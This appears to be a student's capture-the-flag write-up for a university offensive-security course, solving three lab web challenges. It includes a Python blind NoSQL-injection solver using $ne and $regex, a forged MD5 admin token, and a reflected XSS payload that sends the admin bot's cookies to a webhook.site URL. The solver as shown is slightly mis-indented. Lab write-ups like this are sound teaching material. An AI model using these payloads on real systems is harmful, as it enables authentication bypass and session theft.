---
tags:
  - offsec
---
_by Vaughn Valle_

### NoSQL-1 
Visiting the page gives us a login form. When we try random inputs, we get an "Invalid credentials" error.
![[Pasted image 20241210171357.png]]
Since we went over NoSQL and query comparisons in class, let's try that here using `curl`
![[Pasted image 20241210171858.png]]
We successfully bypassed authentication by using the `ne` query operator. Here, we're selecting accounts that have a non-empty password. Thus, we're able to login.

However, the `message` field says that the password of the authenticated account is the flag. Unfortunately, the HTTP response does not give us the record, but merely the status response based on the POST request. This makes this a Blind NoSQLi type of challenge

But remember that with the `regex` operator, we can parse through possible characters for the first letter of the password and work from there. Once we find a match for the first one, we can store that and move on to the next. We can construct the ff. python solver to do just that
```python
import requests
import string

url="http://offsec-chalbroker.osiris.cyber.nyu.edu:10000/"
headers={'content-type': 'application/json', 'cookie': 'CHALBROKER_USER_ID=vqv9731'}

leaked_data = list("flag{")

    for c in string.printable:
        if c not in ['*','+','.','?','|','"']:
            print(f"Trying {''.join(leaked_data) + c}")
            payload='{"username": {"$ne": ""}, "password": {"$regex": "^%s" }}' % ("".join(leaked_data) + c)
            print (payload)
            r = requests.post(url + "api/login", data = payload, headers = headers, verify = False, allow_redirects = False)
            print(r.status_code)
            if 'Yay' in r.text:
                leaked_data.append(c)
```

Note that since we know the flag format, we can append `flag{` to `leaked_data` to save on brute-forcing time. Now we just have to run this script to decipher each letter of the flag and submit!
### Nuclear
When we visit the site, we're greeted by this
![[Pasted image 20241210172707.png]]
Let's try do register using dummy values
![[Pasted image 20241210172744.png]]
And then login using the credentials
![[Pasted image 20241210172812.png]]
![[Pasted image 20241210174216.png]]
Okay so now we have logged into our account. However, I don't see the flag anywhere. If this was similar to the previous challenge, then we need to get into the admin account to get the flag.
After some countless inspection, I decided to look into the document cookies under the Application tab
![[Pasted image 20241210174507.png]]
Interestingly, aside from `CHALBROKER_USER_ID` and the other `__*` cookies, we see a `session` and `token`. I apologize for doing this, but I had to use ChatGPT to figure out what this value meant.
![[Pasted image 20241210174432.png]]
Apparently it is an MD5 HASH that says "hello". What if we set it as `admin` but as an MD5 hash (`21232f297a57a5a743894a0e4a801fc3`)?
![[Pasted image 20241210174713.png]]
We get the flag.

### XSS-1
This challenge is interesting because we have 2 endpoints to exploit: and admin bot and a website.
![[Pasted image 20241210174810.png]]
![[Pasted image 20241210174819.png]]

The site says to get the admin cookie. We know that the admin bot website says that it will visit the url we give it. Thus, is the main website is XSS vulnerable, we can give it javascript code to throw the admin cookie to a middleman/URL endpoint and "get the flag".

Let's test the main website for XSS
`https://offsec-chalbroker.osiris.cyber.nyu.edu:10003/greet?name=%3Cscript%3Ealert(document.cookie)%3C/script%3E`
![[Pasted image 20241210175050.png]]
It is! We can get the website to execute arbitrary JS code and display the current session's cookies. We just have to find a way for the admin bot to visit this URL and expose the cookies through our "middleman". For this we'll use https://webhook.site

Here we have a site URL to act as the middleman: https://webhook.site/94d17262-1ba1-4530-b5d3-a0ba98730626](https://webhook.site/94d17262-1ba1-4530-b5d3-a0ba98730626?cookie=flag=flag{S33_XSS_1snt_s0_h4rd_1s_1t?_e1025dd7f286adc2})|

Once we integrate the middleman URL into the JS payload, we can view the admin cookie from webhook using:
http://offsec-chalbroker.osiris.cyber.nyu.edu:10003/greet?name=%3Cscript%3Ewindow.location.href=%22https://webhook.site/94d17262-1ba1-4530-b5d3-a0ba98730626?cookies=%22%2bdocument.cookie%3C/script%3E
![[Pasted image 20241210173924.png]]
Now we can look at webhook and see the flag in the `cookie` parameter